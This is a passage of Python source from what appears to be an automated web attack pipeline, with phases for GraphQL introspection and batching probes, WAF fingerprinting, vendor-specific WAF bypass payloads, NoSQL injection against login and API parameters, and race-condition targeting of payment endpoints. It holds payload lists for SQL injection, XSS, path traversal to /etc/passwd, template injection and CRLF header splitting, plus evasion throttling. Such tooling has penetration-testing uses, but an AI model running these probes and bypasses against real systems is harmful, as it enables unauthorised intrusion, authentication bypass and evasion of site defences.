        ct = headers.get("Content-Type", "")
        if "application/json" not in ct and "text/json" not in ct:
            return False
        body = body_bytes.decode("utf-8", errors="ignore")
        # GraphQL responses contain 'data', 'errors', or '__typename'
        return '"data"' in body or '"errors"' in body or '__typename' in body
    except Exception:
        return False


_GRAPHQL_ENDPOINTS = [
    "/graphql", "/gql", "/v1/graphql", "/v2/graphql",
    "/api/graphql", "/api/gql", "/graph", "/query",
    "/graphql/", "/gql/", "/explorer", "/graphiql",
    "/v1/gql", "/v2/gql", "/admin/graphql",
]
_GRAPHQL_INTROSPECTION_QUERY = """
{"query":"query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { kind name description fields { name description type { kind name ofType { kind name } } } } } }"}
"""


async def phase_20_GRAPHQL(
    domain: str, outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"20-GRAPHQL"}:
        return {}
    _o_out = outdir / "graphql_introspection.txt"
    if _o_out.exists() and not force:
        return {"20-GRAPHQL": str(_o_out), "count": count_nonblank(_o_out)}
    log("info", "Phase 20-GRAPHQL: GraphQL introspection")
    findings: List[str] = []
    _o_urlopen = _get_urlopener()
    # Collect HTTP targets
    targets: List[str] = []
    hosts_file = Path(prev.get("04-SCAN.targets") or outdir / "host_targets.txt")
    if not hosts_file.exists() or not read_lines(hosts_file):
        hosts_file = Path(prev.get("04-SCAN.hosts") or outdir / "hosts.txt")
    if not hosts_file.exists() or not read_lines(hosts_file):
        hosts_file = Path(prev.get("02-RESOLVE") or outdir / "resolved.txt")
    if hosts_file.exists():
        for h in read_lines(hosts_file)[:_PIPELINE_CFG.sample_hosts_graphql]:
            if not h.startswith("http"):
                h = f"https://{h}"
            targets.append(h.rstrip("/"))
    # Normalize all targets to HTTPS to avoid 308 redirects
    targets = [re.sub(r"^http://", "https://", t) for t in targets]
    if not targets:
        log("warn", "Phase 20-GRAPHQL: no HTTP targets; skipping")
        return {"20-GRAPHQL": str(_o_out), "count": 0}

    # ── Smart pre-check: probe all target×endpoint combos in parallel ──
    # Only run expensive tools (inql, clairvoyance, graphinder) on endpoints
    # that actually respond with GraphQL-like content, avoiding timeouts
    # on non-existent or WAF-blocked endpoints.
    async def _alive_gql_endpoints() -> List[str]:
        alive: List[str] = []
        probe_urls = [f"{tgt}{ep}" for tgt in targets for ep in _GRAPHQL_ENDPOINTS]
        probe_tasks = []
        for url in probe_urls:
            probe_tasks.append(_gql_precheck(url))
        results = await asyncio.gather(*probe_tasks, return_exceptions=True)
        for url, ok in zip(probe_urls, results):
            if ok and not isinstance(ok, Exception):
                alive.append(url)
        return alive

    _live_gql = await _alive_gql_endpoints()
    if _live_gql:
        log("ok", f"20-GRAPHQL: {len(_live_gql)} responsive GraphQL endpoint(s) found")
        for u in _live_gql:
            findings.append(f"[alive] {u}")

    # inql integration (only on live endpoints, skip under proxychains — urllib CONNECT fails with Tor)
    if t.has("inql") and _live_gql and not _USE_PROXYCHAINS:
        inql_out = outdir / "inql_results"
        inql_out.mkdir(parents=True, exist_ok=True)
        inql_jobs: List[Tuple[str, List[str], int]] = []
        for url in _live_gql:
            runner = outdir / "logs" / f"inql_{_safe_name(url)}_runner.sh"
            ensure(runner)
            runner.write_text(
                "#!/usr/bin/env bash\n"
                "set -eu\n"
                f"URL={shlex.quote(url)}\n"
                f"OUT={shlex.quote(str(inql_out))}\n"
                'inql -t "$URL" -o "$OUT"\n'
            )
            runner.chmod(0o700)
            inql_jobs.append((f"inql-{_safe_name(url)}", ["bash", str(runner)], 300))
        if inql_jobs:
            await run_parallel(inql_jobs, outdir)

    # Clairvoyance GraphQL introspection abuse (only on live endpoints)
    if t.has("clairvoyance") and _live_gql:
        clairvoyance_out = outdir / "clairvoyance_results"
        clairvoyance_out.mkdir(parents=True, exist_ok=True)
        cv_jobs: List[Tuple[str, List[str], int]] = []
        for url in _live_gql:
            cv_out = clairvoyance_out / f"{_safe_name(url)}.json"
            runner = outdir / "logs" / f"clairvoyance_{_safe_name(url)}_runner.sh"
            ensure(runner)
            runner.write_text(
                "#!/usr/bin/env bash\n"
                "set -eu\n"
                f"URL={shlex.quote(url)}\n"
                f"OUT={shlex.quote(str(cv_out))}\n"
                'clairvoyance "$URL" -o "$OUT"\n'
            )
            runner.chmod(0o700)
            cv_jobs.append((f"clairvoyance-{_safe_name(url)}", ["bash", str(runner)], 300))
        if cv_jobs:
            await run_parallel(cv_jobs, outdir)
        cv_reports = list(clairvoyance_out.glob("*.json"))
        if cv_reports:
            findings.append(f"[clairvoyance] {len(cv_reports)} schema reports → {clairvoyance_out}")

    # Graphinder GraphQL endpoint discovery (only on live endpoints)
    if t.has("graphinder") and _live_gql:
        graphinder_out = outdir / "graphinder_results"
        graphinder_out.mkdir(parents=True, exist_ok=True)
        gi_jobs: List[Tuple[str, List[str], int]] = []
        for url in _live_gql:
            runner = outdir / "logs" / f"graphinder_{_safe_name(url)}_runner.sh"
            out_file = graphinder_out / f"{_safe_name(url)}.json"
            ensure(runner)
            runner.write_text(
                "#!/usr/bin/env bash\n"
                "set -eu\n"
                f"URL={shlex.quote(url)}\n"
                f"OUT={shlex.quote(str(out_file))}\n"
                'DOMAIN=$(echo "$URL" | sed "s|^https\\?://||" | sed "s|/.*$||")\n'
                'graphinder --domain "$DOMAIN" --output-file "$OUT"\n'
            )
            runner.chmod(0o700)
            gi_jobs.append((f"graphinder-{_safe_name(url)}", ["bash", str(runner)], 600))
        if gi_jobs:
            await run_parallel(gi_jobs, outdir)
        gi_reports = list(graphinder_out.glob("*.json"))
        if gi_reports:
            findings.append(f"[graphinder] {len(gi_reports)} endpoint reports → {graphinder_out}")

    # Custom introspection probes (no-redirect to avoid following redirects away from the endpoint)
    _gql_no_redirect = _get_no_redirect_urlopener()
    async def _probe_graphql(url: str) -> List[str]:
        results: List[str] = []
        live_endpoint: Optional[str] = None
        for ep in _GRAPHQL_ENDPOINTS:
            test_url = f"{url}{ep}"
            try:
                req = urllib.request.Request(test_url, method="POST",
                    data=_GRAPHQL_INTROSPECTION_QUERY.encode(),
                    headers={
                        "Content-Type": "application/json",
                        "User-Agent": "Mozilla/5.0",
                    })
                _, _, gql_body_bytes = await _async_urlopen(_gql_no_redirect, req, timeout=15)
                body = gql_body_bytes.decode("utf-8", errors="ignore")
                live_endpoint = test_url
                if '"data"' in body and '__schema' in body:
                    results.append(f"[introspection-enabled] {test_url}")
                    # Extract schema summary
                    try:
                        data = json.loads(body)
                        schema = data.get("data", {}).get("__schema", {})
                        qtype = schema.get("queryType", {}).get("name", "?")
                        mtype = schema.get("mutationType", {}).get("name", "none")
                        stype = schema.get("subscriptionType", {}).get("name", "none")
                        results.append(f"  query={qtype} mutation={mtype} subscription={stype}")
                        types = schema.get("types", [])
                        field_count = sum(len(t.get("fields") or []) for t in types if isinstance(t, dict))
                        results.append(f"  types={len(types)} fields={field_count}")
                    except json.JSONDecodeError:
                        pass
                    break
            except urllib.error.HTTPError as e:
                try:
                    body_bytes = await asyncio.to_thread(e.read)
                    body = body_bytes.decode("utf-8", errors="ignore")
                    live_endpoint = test_url
                    if '"data"' in body and '__schema' in body:
                        results.append(f"[introspection-enabled (error)] {test_url} (HTTP {e.code})")
                        break
                except Exception:
                    pass
            except Exception:
                continue
            if live_endpoint is None:
                try:
                    get_req = urllib.request.Request(test_url, method="GET",
                        headers={"User-Agent": "Mozilla/5.0"})
                    gs, _, _ = await _async_urlopen(_gql_no_redirect, get_req, timeout=10)
                    if gs != 404:
                        live_endpoint = test_url
                except Exception:
                    pass
        # ── Deep probes against first live endpoint ──
        target = live_endpoint
        if target:
            try:
                aliases = " ".join(f"a{i}:__typename" for i in range(100))
                batch_query = f"{{{aliases}}}"
                b_req = urllib.request.Request(target, method="POST",
                    data=json.dumps({"query": batch_query}).encode(),
                    headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"})
                _, _, b_body = await _async_urlopen(_gql_no_redirect, b_req, timeout=15)
                b_text = b_body.decode("utf-8", errors="ignore")
                if '"data"' in b_text and '"errors"' not in b_text:
                    results.append(f"[graphql-batching] {target} — 100-query batch accepted")
            except Exception:
                pass
            try:
                dup_query = "{a:__typename a:__typename a:__typename}"
                d_req = urllib.request.Request(target, method="POST",
                    data=json.dumps({"query": dup_query}).encode(),
                    headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"})
                _, _, d_body = await _async_urlopen(_gql_no_redirect, d_req, timeout=15)
                d_text = d_body.decode("utf-8", errors="ignore")
                if '"data"' in d_text and '"errors"' not in d_text:
                    results.append(f"[graphql-field-dup] {target} — field duplication accepted")
            except Exception:
                pass
            for pq_id in ["1", "2", "0", "persistedQuery"]:
                try:
                    pq_url = target + f"?queryId={pq_id}"
                    pq_req = urllib.request.Request(pq_url, method="GET",
                        headers={"User-Agent": "Mozilla/5.0"})
                    _, _, pq_body = await _async_urlopen(_gql_no_redirect, pq_req, timeout=10)
                    pq_text = pq_body.decode("utf-8", errors="ignore")
                    if '"data"' in pq_text or ('errors' in pq_text and '"message"' in pq_text):
                        results.append(f"[graphql-pq] {target} — persisted query ID {pq_id} accepted")
                        break
                except Exception:
                    continue
            try:
                pq_ext = {"extensions": {"persistedQuery": {"version": 1, "sha256Hash": "ecf8ed5853e209183ed4e7e813dda39b1d9e0e66f9087c31c3e73b53c0b25e53"}}, "query": "{__typename}"}
                pq_ext_req = urllib.request.Request(target, method="POST",
                    data=json.dumps(pq_ext).encode(),
                    headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"})
                _, _, pq_ext_body = await _async_urlopen(_gql_no_redirect, pq_ext_req, timeout=10)
                if '"data"' in pq_ext_body.decode("utf-8", errors="ignore"):
                    results.append(f"[graphql-pq] {target} — persisted query via extensions accepted")
            except Exception:
                pass
            try:
                depth_query = "{a:" * 9 + "__typename" + "}" * 9
                dp_req = urllib.request.Request(target, method="POST",
                    data=json.dumps({"query": depth_query}).encode(),
                    headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"})
                _, _, dp_body = await _async_urlopen(_gql_no_redirect, dp_req, timeout=15)
                dp_text = dp_body.decode("utf-8", errors="ignore")
                if '"data"' in dp_text:
                    results.append(f"[graphql-depth] {target} — depth 10 query accepted")
            except Exception:
                pass
            try:
                dir_query = "{__typename @include(if:true) __typename @skip(if:false)}"
                di_req = urllib.request.Request(target, method="POST",
                    data=json.dumps({"query": dir_query}).encode(),
                    headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"})
                _, _, di_body = await _async_urlopen(_gql_no_redirect, di_req, timeout=15)
                di_text = di_body.decode("utf-8", errors="ignore")
                if '"data"' in di_text:
                    results.append(f"[graphql-directive] {target} — directive injection accepted")
            except Exception:
                pass
        return results

    probe_results = await asyncio.gather(*[_probe_graphql(t) for t in targets])
    for pr in probe_results:
        findings.extend(pr)
    out = ensure(_o_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"Phase 20-GRAPHQL: {len(findings)} GraphQL findings → {out}")
    return {"20-GRAPHQL": str(out), "count": len(findings)}


# ────────────────── Phase 21-WAF: WAF Detection ──────────────────────────────
_WAF_SIGNATURES: List[Tuple[str, List[str], List[str]]] = [
    # Each entry: (name, header_substring_list, extra_indicator_list)
    # extra_indicators are checked against BOTH headers and body content, and may
    # be a full header name ("x-barracuda"), a "key: value" pair ("server: cloudflare"),
    # a wildcard ("*cloudflare*"), or a bare header prefix ending with ":" ("x-datapower:").
    ("Cloudflare", ["cf-ray", "__cfduid", "cloudflare"], ["server: cloudflare"]),
    ("Akamai", ["akamai"], ["server: akamai"]),
    ("AWS WAF", ["x-amz-id-2", "x-amz-cf-id", "x-amzn-requestid"], ["x-amzn-trace-id"]),
    ("Cloudfront", ["x-amz-cf-id", "x-amz-cf-pop"], []),
    ("F5 BIG-IP", ["x-application-context", "x-request-uid"], ["server: bigip"]),
    ("Imperva", ["x-iinfo", "incapsula"], ["x-cdn: incapsula"]),
    ("ModSecurity", ["x-powered-by: mod_security"], []),
    ("NetScaler", ["x-ns-server"], ["server: netscaler"]),
    ("Sucuri", ["x-sucuri-id", "x-sucuri-cache"], []),
    ("Barracuda", ["x-barracuda"], ["server: barracuda"]),
    ("Wordfence", ["x-wordfence"], []),
    ("StackPath", ["x-stackpath"], []),
    ("DenyAll", ["session-denial"], []),
    ("Radware", ["x-rtd"], ["x-sl-compstate"]),
    ("Comodo", ["x-cfwaf"], []),
    ("Airlock", ["x-arlock"], []),
    ("Fortinet", ["x-fortigate"], ["server: fortigate"]),
    ("Citrix", ["x-citrix"], []),
]
_WAF_PROBE_PAYLOADS = [
    "' OR '1'='1",
    "' UNION SELECT * FROM users--",
    "<script>alert(1)</script>",
    "../../../etc/passwd",
    "${7*7}",
    "{{7*7}}",
    "1; DROP TABLE users",
    "admin' --",
]


async def phase_21_WAF(
    domain: str, outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"21-WAF"}:
        return {}
    _p_out = outdir / "waf_detection.txt"
    if _p_out.exists() and not force:
        return {"21-WAF": str(_p_out), "count": count_nonblank(_p_out)}
    log("info", "Phase 21-WAF: WAF detection")
    findings: List[str] = []
    _p_urlopen = _get_urlopener()
    # Collect HTTP targets
    targets: List[str] = []
    hosts_file = Path(prev.get("04-SCAN.targets") or outdir / "host_targets.txt")
    if not hosts_file.exists() or not read_lines(hosts_file):
        hosts_file = Path(prev.get("04-SCAN.hosts") or outdir / "hosts.txt")
    if not hosts_file.exists() or not read_lines(hosts_file):
        hosts_file = Path(prev.get("02-RESOLVE") or outdir / "resolved.txt")
    if hosts_file.exists():
        for h in read_lines(hosts_file)[:_PIPELINE_CFG.sample_hosts_waf]:
            if not h.startswith("http"):
                h = f"https://{h}"
            targets.append(h.rstrip("/"))
    if not targets:
        log("warn", "Phase 21-WAF: no HTTP targets; skipping")
        return {"21-WAF": str(_p_out), "count": 0}
    # wafw00f integration
    if t.has("wafw00f") or t.has("wafw00f.py"):
        waf_bin = "wafw00f" if t.has("wafw00f") else "wafw00f.py"
        waf_out = outdir / "wafw00f_results.txt"
        await _run(
            "wafw00f",
            [waf_bin, *[tgt.replace("https://", "").replace("http://", "") for tgt in targets],
             "-o", str(waf_out), "-a"],
            600, outdir,
        )
        if waf_out.exists() and waf_out.stat().st_size > 0:
            for ln in read_lines(waf_out):
                findings.append(f"[wafw00f] {ln}")
        elif waf_out.exists():
            waf_out.unlink(missing_ok=True)
            log("warn", "wafw00f: output file is empty (target unreachable or crashed)")
    # Custom passive WAF detection (check response headers and body)
    async def _passive_waf_check(url: str) -> List[str]:
        results: List[str] = []
        try:
            req = urllib.request.Request(url, method="GET",
                headers={"User-Agent": "Mozilla/5.0"})
            _, resp_hdrs, resp_body = await _async_urlopen(_p_urlopen, req, timeout=10)
            headers_str = " ".join(f"{k}: {v}" for k, v in resp_hdrs.items()).lower()
            body = resp_body.decode("utf-8", errors="ignore").lower()
            for waf_name, header_indicators, extra_indicators in _WAF_SIGNATURES:
                detected = False
                for indicator in header_indicators:
                    if indicator.lower() in headers_str:
                        detected = True
                        break
                if not detected:
                    for indicator in extra_indicators:
                        if indicator.lower() in headers_str or indicator.lower() in body:
                            detected = True
                            break
                if detected:
                    results.append(f"[passive] {waf_name} detected on {url}")
                    break
        except Exception:
            pass
        return results

    # Active WAF detection (send malicious payloads, check block codes)
    async def _active_waf_check(url: str) -> List[str]:
        results: List[str] = []
        for payload in _WAF_PROBE_PAYLOADS:
            try:
                probe_url = f"{url}?q={urllib.parse.quote(payload)}"
                req = urllib.request.Request(probe_url, method="GET",
                    headers={"User-Agent": "Mozilla/5.0"})
                awaf_status, _, awaf_body = await _async_urlopen(_p_urlopen, req, timeout=10)
                body = awaf_body.decode("utf-8", errors="ignore").lower()
                if any(kw in body for kw in ("blocked", "denied", "rejected", "waf", "security")):
                    results.append(f"[active-blocked-content] {url} → waf keyword in response for payload: {payload[:40]}")
                    break
            except urllib.error.HTTPError as e:
                if e.code in (403, 406, 429, 503, 501):
                    results.append(f"[active-blocked] {url} → HTTP {e.code} with payload: {payload[:40]}")
                    break
            except Exception:
                continue
        return results

    passive_results = await asyncio.gather(*[_passive_waf_check(t) for t in targets])
    for pr in passive_results:
        findings.extend(pr)
    active_results = await asyncio.gather(*[_active_waf_check(t) for t in targets])
    for ar in active_results:
        findings.extend(ar)
    if not findings:
        findings.append("[passive] No WAF detected (passive signature analysis)")
    out = ensure(_p_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    # Set global WAF state so downstream phases can adjust behavior
    _PIPELINE_CFG.waf_detected = bool(findings and not any("No WAF detected" in f for f in findings))
    # Calculate evasion throttle: if WAF detected, add delay and randomize
    if _PIPELINE_CFG.waf_detected:
        _PIPELINE_CFG.waf_evasion_throttle = max(_PIPELINE_CFG.delay, 1.0)
        # Add jitter recommendation to findings
        findings.append("[waf-evasion] WAF detected — downstream phases should add delay=1.0+ and randomize User-Agent/headers")
    log("ok", f"Phase 21-WAF: {len(findings)} WAF detection findings → {out}")
    return {"21-WAF": str(out), "count": len(findings)}


# ────────────────── Phase 21b-WAFBYPASS: WAF Bypass Testing ──────────────────
_WAF_BYPASS_CORPUS: Dict[str, List[Dict[str, Any]]] = {
    "Cloudflare": [
        {"desc": "chunked encoding", "transform": "chunked", "payload": "' OR '1'='1"},
        {"desc": "double URL encode", "transform": "double_url", "payload": "<script>alert(1)</script>"},
        {"desc": "mixed case", "transform": "mixed_case", "payload": "<sCrIpT>alert(1)</sCrIpT>"},
        {"desc": "parameter pollution via ;", "transform": "semicolon_param", "payload": "' UNION SELECT * FROM users--"},
        {"desc": "\\r\\n header split", "transform": "crlf_header", "payload": "../../../etc/passwd"},
    ],
    "Akamai": [
        {"desc": "unicode normalize", "transform": "unicode", "payload": "<script>alert(1)</script>"},
        {"desc": "response split via \\r in JSON", "transform": "json_cr", "payload": '{"user":"admin\\r\\n"}', "content_type": "application/json"},
    ],
    "AWS WAF": [
        {"desc": "oversize body bypass", "transform": "oversize_body", "payload": "a" * 10000 + "' OR '1'='1"},
        {"desc": "gzip bomb", "transform": "gzip_bomb", "payload": "' UNION SELECT * FROM users--"},
    ],
    "ModSecurity": [
        {"desc": "protocol parser diff", "transform": "protocol_diff", "payload": "{{7*7}}"},
    ],
}

_WAF_BYPASS_GENERIC = [
    {"desc": "URL encoded", "transform": "url_encoded", "payload": "' OR '1'='1"},
    {"desc": "double URL encoded", "transform": "double_url", "payload": "<script>alert(1)</script>"},
    {"desc": "tab instead of space", "transform": "tab_space", "payload": "' || 1=1 --"},
    {"desc": "null byte prefix", "transform": "null_byte", "payload": "%00' OR '1'='1"},
]


async def phase_21b_WAFBYPASS(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"21b-WAFBYPASS"}:
        return {}
    _out = outdir / "waf_bypass.txt"
    if _out.exists() and not force:
        return {"21b-WAFBYPASS": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 21b-WAFBYPASS: WAF bypass technique testing")
    findings: List[str] = []
    _wb_urlopen = _get_urlopener()
    _wb_extra_headers = _extra_headers_dict()

    # Read WAF detection results
    waf_file = outdir / "waf_detection.txt"
    waf_vendors: Set[str] = set()
    if waf_file.exists():
        for ln in read_lines(waf_file):
            low = ln.lower()
            for vendor in _WAF_BYPASS_CORPUS:
                if vendor.lower() in low:
                    waf_vendors.add(vendor)

    with contextlib.suppress(Exception):
        for p in Path(outdir).glob("wafw00f_results.txt"):
            if p.exists():
                for ln in read_lines(p):
                    low = ln.lower()
                    for vendor in _WAF_BYPASS_CORPUS:
                        if vendor.lower() in low:
                            waf_vendors.add(vendor)

    # Collect targets
    targets: List[str] = []
    hosts_file = Path(prev.get("04-SCAN.targets") or outdir / "host_targets.txt")
    if not hosts_file.exists() or not read_lines(hosts_file):
        hosts_file = Path(prev.get("04-SCAN.hosts") or outdir / "hosts.txt")
    if not hosts_file.exists() or not read_lines(hosts_file):
        hosts_file = Path(prev.get("02-RESOLVE") or outdir / "resolved.txt")
    if hosts_file.exists():
        for h in read_lines(hosts_file)[:5]:
            if not h.startswith("http"):
                h = f"https://{h}"
            targets.append(h.rstrip("/"))
    if not targets:
        log("warn", "21b-WAFBYPASS: no targets; skipping")
        return {"21b-WAFBYPASS": str(_out), "count": 0}

    if not waf_vendors:
        log("warn", "21b-WAFBYPASS: no WAF detected; running generic bypass probes only")
    else:
        log("info", f"21b-WAFBYPASS: targeting {', '.join(sorted(waf_vendors))} WAF(s)")

    async def _has_waf_blocked(url: str, body: str, status: int) -> bool:
        block_kw = {"blocked", "denied", "rejected", "waf", "security", "forbidden",
                     "access denied", "request blocked", "challenge", "attention required"}
        body_lower = body.lower()
        if status in (403, 406, 429, 503, 501):
            return True
        if any(kw in body_lower for kw in block_kw):
            return True
        return False

    async def _try_bypass(target: str, entry: Dict[str, Any]) -> Optional[str]:
        transform = entry.get("transform", "")
        payload = entry.get("payload", "")
        desc = entry.get("desc", "")
        base_url = f"{target}/"
        probe_url = f"{base_url}?q={urllib.parse.quote(payload)}"
        headers = {"User-Agent": "Mozilla/5.0", **_wb_extra_headers}

        if transform == "double_url":
            probe_url = f"{base_url}?q={urllib.parse.quote(urllib.parse.quote(payload))}"
        elif transform == "mixed_case":
            probe_url = f"{base_url}?q={urllib.parse.quote(entry['payload'])}"
        elif transform == "semicolon_param":
            probe_url = f"{base_url};?q={urllib.parse.quote(payload)}"
        elif transform == "crlf_header":
            headers["X-Forwarded-For"] = "127.0.0.1\r\nX-Hack: 1"
        elif transform == "unicode":
            payload = payload.replace("<", "%uFF1C").replace(">", "%uFF1E")
            probe_url = f"{base_url}?q={payload}"
        elif transform == "json_cr":
            headers["Content-Type"] = entry.get("content_type", "application/json")
        elif transform == "oversize_body":
            probe_url = f"{base_url}?q={urllib.parse.quote(payload)}"
        elif transform == "gzip_bomb":
            return None
        elif transform == "protocol_diff":
            probe_url = f"{base_url}?q={urllib.parse.quote(payload)}"
            headers["Transfer-Encoding"] = "chunked"
        elif transform == "url_encoded":
            probe_url = f"{base_url}?q={urllib.parse.quote(payload)}"
        elif transform == "tab_space":
            probe_url = f"{base_url}?q={urllib.parse.quote(payload.replace(' ', '%09'))}"
        elif transform == "null_byte":
            probe_url = f"{base_url}?q={urllib.parse.quote(payload)}"

        try:
            req = urllib.request.Request(probe_url, method="GET", headers=headers)
            s, _, body_bytes = await _async_urlopen(_wb_urlopen, req, timeout=10)
            body = body_bytes.decode("utf-8", errors="ignore")
            if not await _has_waf_blocked(probe_url, body, s):
                return f"[waf-bypass] {target} — {desc} — HTTP {s} — payload reached origin"
            return f"[waf-blocked] {target} — {desc} — HTTP {s} — blocked by WAF"
        except urllib.error.HTTPError as e:
            if e.code in (403, 406, 429, 503, 501):
                return f"[waf-blocked] {target} — {desc} — HTTP {e.code} — blocked by WAF"
            return None
        except Exception:
            return None

    bypass_corpus: List[Dict[str, Any]] = []
    for vendor in waf_vendors:
        bypass_corpus.extend(_WAF_BYPASS_CORPUS.get(vendor, []))
    if not bypass_corpus:
        bypass_corpus = list(_WAF_BYPASS_GENERIC)

    for target in targets:
        for entry in bypass_corpus:
            await _throttle_rate()
            result = await _try_bypass(target, entry)
            if result:
                findings.append(result)

    if not findings:
        findings.append("[waf-bypass] No WAF bypass techniques confirmed (expected)")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"21b-WAFBYPASS: {len(findings)} bypass checks → {out}")
    return {"21b-WAFBYPASS": str(out), "count": len(findings)}


# ────────────────── Phase 22-NOSQLI: NoSQL Injection ─────────────────────────
_NOSQLI_PAYLOADS: List[Dict[str, Any]] = [
    {"$gt": ""},
    {"$ne": ""},
    {"$gt": "admin"},
    {"$regex": ".*"},
    {"$where": "1==1"},
    {"$exists": True},
    {"$ne": "nonexistent"},
    {"$in": ["admin", "true"]},
]
_NOSQLI_PARAMS = {"username", "user", "pass", "password", "email", "token", "id", "role", "admin", "name"}


async def phase_22_NOSQLI(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"22-NOSQLI"}:
        return {}
    _out = outdir / "nosqli.txt"
    if _out.exists() and not force:
        return {"22-NOSQLI": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 22-NOSQLI: NoSQL injection probes")
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("warn", "22-NOSQLI: no URLs; skipping")
        return {"22-NOSQLI": str(_out), "count": 0}
    findings: List[str] = []
    _n_urlopen = _get_urlopener()
    _n_extra_headers = _extra_headers_dict()
    param_urls = [u for u in all_urls if "=" in u and not _is_static_url(u)][:_PIPELINE_CFG.sample_urls_nosqli]
    _NOSQLI_BASELINE_KEYWORDS = {"mongodb", "mongo", "nosql", "cast", "objectid"}
    for u in param_urls:
        parsed = urllib.parse.urlparse(u)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        if not qs:
            continue
        baseline_body_lower = ""
        try:
            base_req = urllib.request.Request(u, headers={"User-Agent": "Mozilla/5.0", **_n_extra_headers})
            _, _, base_bytes = await _async_urlopen(_n_urlopen, base_req, timeout=10)
            baseline_body_lower = base_bytes.decode("utf-8", errors="ignore").lower()
        except Exception:
            continue
        for param_name in qs:
            if param_name.lower() not in _NOSQLI_PARAMS:
                continue
            if param_name.lower() in _SKIP_PARAMS:
                continue
            for payload in _NOSQLI_PAYLOADS:
                try:
                    await _throttle_rate()
                    test_qs = qs.copy()
                    test_qs[param_name] = [json.dumps(payload)]
                    new_qs = urllib.parse.urlencode(test_qs, doseq=True)
                    test_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))
                    req = urllib.request.Request(test_url, headers={"User-Agent": "Mozilla/5.0", **_n_extra_headers})
                    ns_status, _, ns_body = await _async_urlopen(_n_urlopen, req, timeout=10)
                    body = ns_body.decode("utf-8", errors="ignore").lower()
                    if ns_status in (200, 201) and body != baseline_body_lower:
                        findings.append(f"[nosqli-payload] {test_url} param={param_name} payload={json.dumps(payload)} (body changed from baseline)")
                        break
                    if ns_status in (500, 400):
                        baseline_new_kw = {w for w in _NOSQLI_BASELINE_KEYWORDS if w in body and w not in baseline_body_lower}
                        if baseline_new_kw:
                            findings.append(f"[nosqli-error] {test_url} param={param_name} payload={json.dumps(payload)} → HTTP {ns_status} keywords={baseline_new_kw}")
                            break
                except Exception:
                    continue
    # Also probe JSON API endpoints with NoSQL bodies
    api_targets = [u.split("?")[0] for u in all_urls if "/api/" in u.lower() and not _is_static_url(u)][:_PIPELINE_CFG.sample_urls_nosqli]
    for u in api_targets:
        api_baseline = ""
        try:
            base_req = urllib.request.Request(u, headers={"User-Agent": "Mozilla/5.0", **_n_extra_headers})
            _, _, base_bytes = await _async_urlopen(_n_urlopen, base_req, timeout=10)
            api_baseline = base_bytes.decode("utf-8", errors="ignore").lower()
        except Exception:
            continue
        for payload in _NOSQLI_PAYLOADS:
            try:
                await _throttle_rate()
                body_data = json.dumps({"username": payload, "password": {"$ne": ""}}).encode()
                req = urllib.request.Request(u, data=body_data, method="POST",
                    headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0", **_n_extra_headers})
                ns_status, _, ns_body = await _async_urlopen(_n_urlopen, req, timeout=10)
                ns_body_text = ns_body.decode("utf-8", errors="ignore").lower()
                if ns_status in (200, 201) and ns_body_text != api_baseline:
                    findings.append(f"[nosqli-json] POST {u} payload={json.dumps(payload)} → HTTP {ns_status} (body changed)")
            except Exception:
                continue
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"22-NOSQLI: {len(findings)} NoSQL injection probes → {out}")
    return {"22-NOSQLI": str(out), "count": len(findings)}


# ────────────────── Phase 23-RACE: Race Condition Detection ────────────────────
async def phase_23_RACE(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"23-RACE"}:
        return {}
    _out = outdir / "race_conditions.txt"
    if _out.exists() and not force:
        return {"23-RACE": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 23-RACE: race condition detection")
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("warn", "23-RACE: no URLs; skipping")
        return {"23-RACE": str(_out), "count": 0}
    findings: List[str] = []
    _r_urlopen = _get_urlopener()
    _r_extra_headers = _extra_headers_dict()
    _race_sem = asyncio.Semaphore(20)
    # Target state-changing endpoints from 05-HARVEST: POST/PUT/DELETE with financial or quota keywords
    state_change_keywords = ("redeem", "transfer", "purchase", "vote", "checkout", "payment", "order",
                            "withdraw", "deposit", "refund", "cancel", "subscribe", "upgrade", "downgrade",
                            "apply", "claim", "submit", "update", "delete", "remove")
    targets = [
        u for u in all_urls
        if not _is_static_url(u) and any(m in u.split("?")[0].lower() for m in
           ("/api/", "/account", "/user", "/register", "/login", "/password", "/order", "/checkout", "/payment"))
    ][:_PIPELINE_CFG.sample_endpoints_race]
    # Prioritize state-changing endpoints
    state_change_urls = [u for u in all_urls if not _is_static_url(u) and any(kw in u.lower() for kw in state_change_keywords)]
    if state_change_urls:
        targets = state_change_urls[:_PIPELINE_CFG.sample_endpoints_race]
    if not targets:
        targets = [
            u for u in all_urls
            if not _is_static_url(u) and any(m in u.split("?")[0].lower() for m in
               ("/api/", "/account", "/user", "/register", "/login", "/password", "/order", "/checkout", "/payment"))
        ][:_PIPELINE_CFG.sample_endpoints_race]
    if not targets:
